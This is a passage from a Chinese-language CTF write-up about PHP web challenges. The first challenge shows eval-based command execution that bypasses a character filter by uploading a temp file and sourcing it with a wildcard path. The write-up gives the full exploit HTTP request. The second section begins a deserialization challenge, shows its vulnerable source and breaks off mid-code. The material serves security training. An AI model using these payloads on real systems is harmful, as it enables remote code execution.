punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=UTF-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h4</span><span class=\"token punctuation\">&gt;</span></span>where is the flag?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h4</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">&lt;!-- hint:?cmd= --&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-oq-z0-9$]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cerror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\'|\\\"|\\:|\\,/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"serror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>     <span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>在 php 中，使用 <code>Content-Type: multipart/form-data;</code>  上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code>  参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code> 。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 <code>phpXXXX.tmp</code> （Windows 中）、 <code>php**.tmp</code> （Linux 中）。</p>\n<p>思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用 <code>eval</code>  函数进行执行临时文件。<br>\n然后再看 cmd 这里有两个过滤，过滤了除 p 以外的所有字母数字，可用的特殊字符为 <code>. ? /</code>  等。在 linux 中， <code>source</code>  命令和 <code>.</code>  相同，用于从当前 shell 会话中读取文件和执行命令。<br>\n在 php 中，命令执行方式有：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>system ('ls')</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>echo ('ls')</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo ls</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;?= 等价于 &lt;?php echo</pre></td></tr></tbody></table></figure><p>因为  <code>&lt;?=</code>  没有被过滤，所以就可以用 <code>?&gt;&lt;?=</code>  来传递命令执行临时文件的内容，构造的语句为 <code>?&gt;&lt;?= .+/??p/p?p??????; ， ?&gt; </code> 为了闭合之前的 php 语句，后面为执行命令的语句， <code>+</code>  在 url 中表示空格，利用？通配符匹配到 <code>/tmp/php**.tmp</code>  文件。<br>\n最终构造的 payload 为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host: 11b1397e-2020-484b-a7d3-484f22d4935b.challenge.ctf.show</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Accept-Encoding: gzip, deflate</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Connection: keep-alive</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Content-Length: 242</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-----------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Content-Disposition: form-data; name=\"fileUpload\"; filename=\"1.txt\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Content-Type: text/plain</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>#! /bin/bash</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cat /flag.txt</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>-----------------------------10242300956292313528205888--</pre></td></tr></tbody></table></figure><h2 id=\"game-gyctf-web2\"><a class=\"anchor\" href=\"#game-gyctf-web2\">#</a> game-gyctf web2</h2>\n<p>该题主要考察的时 php 反序列化和反序列化字符串逃逸</p>\n<p>首先，扫描出 <code>www.zip</code>  可以看到源码，分别为</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string double-quoted-string\">\"lib.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__DIR__</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>lib.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$array</span><span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'union'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'regexp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'into'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'insert'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"alter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token operator\">=</span><span class=\"token variable\">$mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select id,password from user where username=?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你的ID是\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你好！\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$Info</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getNewinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$updateAction</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Info</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"update user SET age=<span class=\"token interpolation\"><span class=\"token variable\">$age</span></span>,nickname=<span class=\"token interpolation\"><span class=\"token variable\">$nickname</span></span> where id=\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 这个功能还没有写完 先占坑</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getNewInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nickname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 危</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">}</span>   </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token 